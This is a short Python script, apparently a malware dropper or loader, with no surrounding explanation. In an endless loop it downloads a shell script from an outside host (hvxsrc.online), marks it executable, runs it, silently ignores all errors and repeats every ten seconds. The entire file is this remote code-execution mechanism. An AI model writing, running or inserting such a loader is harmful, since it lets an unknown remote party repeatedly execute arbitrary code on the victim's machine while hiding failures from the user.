import urllib.request
import os
import subprocess
import time

url = "https://hvxsrc.online/x.sh"
filename = "x.sh"

while True:
    try:
        urllib.request.urlretrieve(url, filename)
        os.chmod(filename, 0o755)
        subprocess.run(["./" + filename], check=True)
    except Exception as e:
        pass
    time.sleep(10)